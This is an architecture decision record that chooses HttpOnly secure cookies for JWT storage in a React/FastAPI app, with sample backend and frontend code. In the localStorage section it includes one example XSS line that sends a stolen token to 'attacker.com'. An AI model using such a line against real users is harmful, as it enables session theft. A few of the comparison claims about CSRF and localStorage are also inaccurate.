# ADR-006: Token Storage in HttpOnly Secure Cookies

**Status:** Accepted
**Date:** 2025-12-28
**Deciders:** Development Team
**Affected Components:** Frontend (React), Backend (FastAPI), Session Management

---

## Context

The signup/signin system needs to securely store JWT tokens on the client-side for authentication. The project faces a critical decision about where and how to store tokens:

1. **Accessibility**: Tokens must be sent with every authenticated request
2. **Persistence**: Tokens must survive page reload (session persistence)
3. **Security**: Tokens must be protected against XSS and CSRF attacks
4. **User Experience**: Token management should be transparent to users
5. **Scalability**: Solution must work with stateless JWT-based API

Different token storage mechanisms have significant security and usability implications.

---

## Decision

**We will store JWT tokens in HttpOnly secure cookies with the following configuration:**

```
HttpOnly: true        (prevents JavaScript access - XSS protection)
Secure: true          (HTTPS only - prevents man-in-the-middle)
SameSite: Strict      (prevents CSRF attacks)
Path: /               (available to entire application)
Domain: example.com   (specific to application domain)
Max-Age: 900 seconds  (15 minutes for access token)
```

**Implementation:**
- Access token stored in `auth_token` httpOnly cookie (15-minute expiry)
- Refresh token stored in `refresh_token` httpOnly cookie (7-day expiry)
- Automatic cookie inclusion in all authenticated requests
- Server-side token validation on every protected endpoint

---

## Rationale

### Why HttpOnly Cookies?

**Security Advantages:**
1. **XSS Protection**: JavaScript cannot access cookies with HttpOnly flag; if attacker injects JS, cannot steal tokens
2. **CSRF Protection**: SameSite=Strict prevents cross-site requests from accessing tokens
3. **Automatic Transmission**: Browser automatically includes cookies in requests; no manual header setup needed
4. **Session Persistence**: Cookies persist across page reloads, tab switches, and browser restarts
5. **HTTPS Enforcement**: Secure flag ensures tokens only transmitted over HTTPS (production)
6. **Server Control**: Server dictates token expiry, not client-side code

**Implementation Advantages:**
1. **Stateless API**: No need for session store; validation through token signature
2. **Transparent to Frontend**: Frontend doesn't need to manage tokens manually
3. **Less Code**: No custom token refresh logic needed in frontend (handled by server)
4. **Better UX**: Users don't get logged out unexpectedly during session

### Trade-Offs with Alternatives

**Alternative 1: LocalStorage**
```javascript
// Frontend stores token in localStorage
localStorage.setItem('authToken', token);
// Must manually include in every request
headers: { Authorization: `Bearer ${localStorage.getItem('authToken')}` }
```

**Advantages:**
- ✅ Simple to implement
- ✅ Accessible from any domain (good for APIs)
- ✅ More control over persistence

**Disadvantages:**
- ❌ **Vulnerable to XSS**: Any injected JavaScript can steal token: `fetch('attacker.com?token=' + localStorage.getItem('authToken'))`
- ❌ **No CSRF Protection**: Attacker can make requests with user's token
- ❌ **Manual Header Management**: Must manually add Authorization header to every request
- ❌ **No Automatic Cleanup**: Token persists until explicitly cleared; could be stale

**Decision: Rejected** - XSS vulnerability too severe for secure authentication

---

**Alternative 2: SessionStorage**
```javascript
// Frontend stores token in sessionStorage (cleared on tab close)
sessionStorage.setItem('authToken', token);
```

**Advantages:**
- ✅ Cleared when tab closes (better than localStorage)
- ✅ Simple implementation

**Disadvantages:**
- ❌ **Same XSS Vulnerability**: JavaScript can still steal tokens
- ❌ **No Page Reload Persistence**: Token lost if user refreshes page
- ❌ **Incompatible with Requirement**: Spec requires session persistence across reload
- ❌ **Same CSRF Issues**: No automatic CSRF protection

**Decision: Rejected** - Doesn't meet requirement for cross-reload persistence

---

**Alternative 3: Custom Secure Storage (Encrypted LocalStorage)**
```javascript
// Encrypt tokens before storing in localStorage
const encrypted = encrypt(token, secretKey);
localStorage.setItem('authToken', encrypted);
// Decrypt on use
const token = decrypt(localStorage.getItem('authToken'), secretKey);
```

**Advantages:**
- ✅ Some additional protection layer
- ✅ Avoids plaintext in localStorage

**Disadvantages:**
- ❌ **False Security**: Encryption key stored in JavaScript; not actually secure
- ❌ **XSS Still Works**: Attacker can steal encrypted token and decrypt key
- ❌ **Complexity**: Adds encryption/decryption overhead
- ❌ **No CSRF Protection**: Still vulnerable to CSRF attacks
- ❌ **Over-Engineering**: Solves wrong problem

**Decision: Rejected** - Doesn't actually solve the security problem; adds unnecessary complexity

---

**Alternative 4: Memory Storage (No Persistence)**
```javascript
let authToken = null;  // Store in JavaScript variable
// Token lost on page reload
```

**Advantages:**
- ✅ Most secure against XSS (token in memory)
- ✅ Simple implementation

**Disadvantages:**
- ❌ **No Session Persistence**: Token lost on page reload (doesn't meet requirement)
- ❌ **Poor UX**: Users logged out after every refresh
- ❌ **Incompatible with Spec**: Explicitly requires cross-reload persistence

**Decision: Rejected** - Doesn't meet specification requirement

---

### Security Comparison Table

| Mechanism | XSS Safe | CSRF Safe | Persistent | Code Complexity | Recommendation |
|-----------|----------|-----------|-----------|-----------------|----------------|
| **HttpOnly Cookies** | ✅ Yes | ✅ Yes (Strict) | ✅ Yes | Low | **CHOSEN** |
| LocalStorage | ❌ No | ❌ No | ✅ Yes | Low | Not Suitable |
| SessionStorage | ❌ No | ❌ No | ❌ No | Low | Not Suitable |
| Custom Encryption | ❌ No | ❌ No | ✅ Yes | High | Not Suitable |
| Memory Only | ✅ Yes | ✅ Yes | ❌ No | Low | Not Suitable |

---

## Implementation

### Backend Configuration

**FastAPI with Better Auth:**
```python
# backend/app/config.py
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

# Configure CORS to allow credentials (cookies)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://example.com"],
    allow_credentials=True,  # CRITICAL: Allow cookies
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Content-Type", "Authorization"],
)

# Better Auth cookie configuration
COOKIE_CONFIG = {
    "httponly": True,
    "secure": True,  # False in development, True in production
    "samesite": "strict",
    "path": "/",
    "max_age": 900,  # 15 minutes for access token
}
```

**Registration Response - Sets Cookie:**
```python
from fastapi.responses import JSONResponse

@app.post("/api/auth/register")
async def register(request: RegisterRequest):
    # ... registration logic ...
    token = auth.generate_access_token(user)
    response = JSONResponse(
        {"status": 201, "data": {"user": user, "message": "Registered"}},
        status_code=201
    )
    # Browser receives Set-Cookie header
    response.set_cookie(
        key="auth_token",
        value=token,
        httponly=True,
        secure=True,
        samesite="strict",
        max_age=900,
        path="/"
    )
    return response
```

### Frontend Usage

**React with Automatic Cookie Inclusion:**
```javascript
// frontend/src/services/api.js
import axios from 'axios';

const api = axios.create({
  baseURL: 'https://api.example.com',
  withCredentials: true,  // CRITICAL: Include cookies in requests
  headers: {
    'Content-Type': 'application/json',
  }
});

// Every request automatically includes cookies
// No manual Authorization header needed
api.post('/auth/login', { email, password })
  .then(response => {
    // Token automatically in cookie, no need to store
    // Next request will automatically include auth_token cookie
  })
```

**Custom Hook for Authentication:**
```javascript
// frontend/src/hooks/useAuth.js
import { useState, useEffect } from 'react';
import api from '../services/api';

export function useAuth() {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    // On mount, check if session exists (via cookie)
    api.get('/auth/me')
      .then(res => setUser(res.data))
      .catch(() => setUser(null))
      .finally(() => setLoading(false));
  }, []);

  const logout = () => {
    // Cookie automatically included in request
    // Server clears cookie in response
    api.post('/auth/logout').finally(() => {
      setUser(null);
    });
  };

  return { user, loading, logout };
}
```

### Middleware - Token Validation

```python
# backend/app/middleware/auth.py
from fastapi import Request, HTTPException

@app.middleware("http")
async def auth_middleware(request: Request, call_next):
    # Extract token from cookie (automatically parsed by Starlette)
    token = request.cookies.get("auth_token")

    if token:
        try:
            # Validate token signature and expiry
            user = auth.validate_token(token)
            request.state.user = user  # Store user in request state
        except InvalidTokenError:
            # Invalid or expired token
            request.state.user = None
    else:
        request.state.user = None

    return await call_next(request)

# Protected route
@app.get("/api/auth/me")
async def get_current_user(request: Request):
    if not request.state.user:
        raise HTTPException(status_code=401, detail="Unauthorized")
    return request.state.user
```

---

## Consequences

### Positive Consequences

1. **Superior Security**: XSS and CSRF protection built-in by browser
2. **Automatic Transmission**: No manual token management in frontend code
3. **Session Persistence**: Tokens persist across page reloads
4. **HTTPS Enforcement**: Secure flag ensures encrypted transmission
5. **Server Control**: Server controls token expiry, not client
6. **Better UX**: Seamless session management; users don't notice auth
7. **Standards Compliant**: Follows OWASP and HTTP authentication best practices

### Negative Consequences

1. **CORS Complexity**: Must set `withCredentials: true` on frontend; `allow_credentials: true` on backend
2. **HTTPS Required**: Secure flag requires HTTPS in production (necessary anyway)
3. **SameSite Limitations**: SameSite=Strict may break some legitimate cross-site scenarios
4. **Cookie Size Limits**: Cookies limited to 4KB (JWT tokens usually <1KB, so not an issue)
5. **Third-Party Cookie Issues**: If frontend on different domain than API, browser restrictions apply
6. **Subdomain Sharing**: Cookies shared across subdomains by default (may be security issue)

### Mitigations for Negative Consequences

| Consequence | Mitigation |
|-------------|-----------|
| CORS Complexity | Document clearly; use provided code examples |
| HTTPS Required | HTTPS required anyway for security; non-negotiable |
| SameSite Limitations | Test cross-site scenarios; use SameSite=Lax if needed (less secure) |
| Cookie Size | JWT <1KB; not a concern |
| Third-Party Cookies | Frontend and API on same domain (example.com); subdomain cookies scoped to Domain |
| Subdomain Sharing | Set Domain explicitly; scope to main domain only |

---

## Development Timeline Impact

**Spike Task (Task 1.3):** Validates cookie configuration and CORS setup
**Phase 2 (Backend):** Implement response.set_cookie() in registration/login endpoints
**Phase 3 (Frontend):** Configure axios with withCredentials=true

**Time Estimate:** Additional 1-2 hours for CORS configuration and testing
**Risk:** Medium - Cookie security configuration critical; must test thoroughly

---

## Testing Requirements

### Security Testing

1. **XSS Prevention**: Inject JavaScript; verify tokens not accessible
2. **CSRF Prevention**: Attempt cross-origin request; verify blocked by SameSite
3. **HTTPS Enforcement**: Attempt HTTP request with token; verify rejected
4. **Cookie Scope**: Test cookie available only to intended domain
5. **Expiry**: Test cookie removed after Max-Age seconds

### Functional Testing

1. **Session Persistence**: Reload page; verify still authenticated
2. **Tab Switching**: Open in multiple tabs; verify same session
3. **Manual Logout**: Logout; verify cookie cleared
4. **CORS Requests**: Verify cookies included in cross-origin requests
5. **Refresh Token**: Verify automatic token refresh before expiry

---

## Related Decisions

- **ADR-005**: Better Auth Library Selection (depends on this)
- **ADR-007**: Bcrypt Password Hashing Configuration (complementary)
- **ADR-008**: Database Schema Normalization (independent)

---

## References

- [OWASP: Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [MDN: HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [OWASP: Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf)
- [RFC 6265: HTTP State Management Mechanism](https://tools.ietf.org/html/rfc6265)
- [SameSite Cookie Explained](https://web.dev/samesite-cookies-explained/)
- Task 1.4: CORS Middleware Implementation
- Task 2.2: Login Endpoint with Cookie Setup

---

## Approval

- **Proposed By:** Development Team
- **Reviewed By:** [To be assigned]
- **Approved By:** [To be assigned]
- **Approval Date:** [Date to be set]
- **Review Date:** 2026-01-28
